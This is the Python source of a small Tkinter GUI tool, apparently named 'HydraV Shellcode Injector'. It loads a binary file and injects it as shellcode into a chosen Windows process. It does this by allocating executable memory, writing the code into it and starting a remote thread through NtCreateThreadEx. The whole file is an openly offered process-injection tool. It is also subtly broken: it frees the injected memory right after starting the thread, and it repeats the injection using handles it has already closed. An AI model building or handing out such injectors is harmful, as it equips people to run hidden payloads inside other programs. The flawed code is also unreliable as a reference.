import ctypes
import psutil
from tkinter import filedialog, messagebox
from tkinter import *

# Constants for Windows API flags and access rights
PROCESS_ALL_ACCESS = 0x1FFFFF
MEM_COMMIT_RESERVE = 0x3000
PAGE_EXECUTE_READWRITE = 0x40
MEM_RELEASE = 0x8000


# Function to open a binary file and inject into the specified process by PID
def Open_Binary_File(pid_entry):
    pid = pid_entry.get()
    if not pid:
        messagebox.showerror("Error", "Please enter a valid PID.")
        return

    try:
        pid = int(pid)
    except ValueError:
        messagebox.showerror("Error", "PID must be a valid integer.")
        return

    file_path = filedialog.askopenfilename(filetypes=[("Binary files", "*.bin"), ("All files", "*.*")])
    if file_path:
        try:
            with open(file_path, 'rb') as f:
                shellcode = f.read()
                execute_shellcode_ntcreatethreadex(shellcode, pid)
                messagebox.showinfo("Success", f"Shellcode injected into process {pid}")
        except Exception as e:
            messagebox.showerror("Error", str(e))

# Function to execute shellcode using NtCreateThreadEx
def execute_shellcode_ntcreatethreadex(shellcode, pid):
    nt = ctypes.windll.ntdll
    kernel32 = ctypes.windll.kernel32

    try:
        # Convert shellcode to bytes if necessary
        if not isinstance(shellcode, bytes):
            shellcode = bytes(shellcode)

        shellcode_size = len(shellcode)

        # Open the target process with full access
        process_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not process_handle:
            raise ctypes.WinError()

        try:
            # Allocate memory in the target process for the shellcode
            ptr = kernel32.VirtualAllocEx(
                process_handle,
                None,
                shellcode_size,
                MEM_COMMIT_RESERVE,
                PAGE_EXECUTE_READWRITE
            )
            if not ptr:
                raise ctypes.WinError()

            try:
                # Write the shellcode to allocated memory
                written = ctypes.c_ulong(0)
                if not kernel32.WriteProcessMemory(process_handle, ptr, shellcode, shellcode_size, ctypes.byref(written)):
                    raise ctypes.WinError()

                # Create remote thread to execute the shellcode
                thread_id = ctypes.c_ulong(0)
                status = nt.NtCreateThreadEx(
                    ctypes.byref(thread_id),                # Thread Id
                    PROCESS_ALL_ACCESS,                    # DesiredAccess
                    None,                                   # ObjectAttributes
                    process_handle,                         # ProcessHandle
                    ptr,                                    # lpStartAddress (shellcode address)
                    None,                                   # lpParameter (null for this example)
                    False,                                  # CreateSuspended
                    0,                                      # StackZeroBits
                    0,                                      # SizeOfStackCommit
                    0,                                      # SizeOfStackReserve
                    None                                    # lpBytesBuffer
                )
                if status < 0:
                    raise ctypes.WinError(status)

            finally:
                # Clean up allocated memory in the target process
                kernel32.VirtualFreeEx(process_handle, ptr, 0, MEM_RELEASE)

        finally:
            # Close the process handle
            kernel32.CloseHandle(process_handle)

    except Exception as e:
        raise RuntimeError(f"Failed to inject shellcode into process {pid}: {str(e)}")

    # Write the shellcode to allocated memory in the target process
    written = ctypes.c_ulong(0)
    kernel32.WriteProcessMemory(process_handle, ptr, shellcode, shellcode_size, ctypes.byref(written))

    # Create remote thread to execute the shellcode
    thread_id = ctypes.c_ulong(0)
    nt.NtCreateThreadEx(ctypes.byref(thread_id), 0x1FFFFF, None, process_handle, ptr, None, 0, 0, 0, 0, None)

    # Close handles
    kernel32.CloseHandle(thread_id)
    kernel32.CloseHandle(process_handle)

# UI function
def ui():
    app = Tk()
    app.title('HydraV Shellcode Injector')
    app.geometry('300x300')

    # Label and entry for PID input
    label_pid = Label(app, text='Enter PID:')
    label_pid.pack(pady=10)

    pid_entry = Entry(app, width=30)
    pid_entry.pack(pady=10)

    # Button to open binary file and inject shellcode
    button_open = Button(app, text='Open Binary File', command=lambda: Open_Binary_File(pid_entry))
    button_open.pack(pady=10)

    # Button to inject shellcode
    button_inject = Button(app, text='Inject Shellcode', command=lambda: Open_Binary_File(pid_entry))
    button_inject.pack(pady=10)

    # Button for credits
    button_credits = Button(app, text='Credits', command=Credits)
    button_credits.pack(pady=10)

    app.mainloop()

# Function to show credits
def Credits():
    app2 = Tk()
    app2.title('HydraV Shellcode Injection - Credits')
    app2.geometry('275x75')

    label2 = Label(app2, text='Developed By Deccatron')
    label2.place(relx=0.5, rely=0.5, anchor='center')

    app2.mainloop()

# Run the UI
ui()
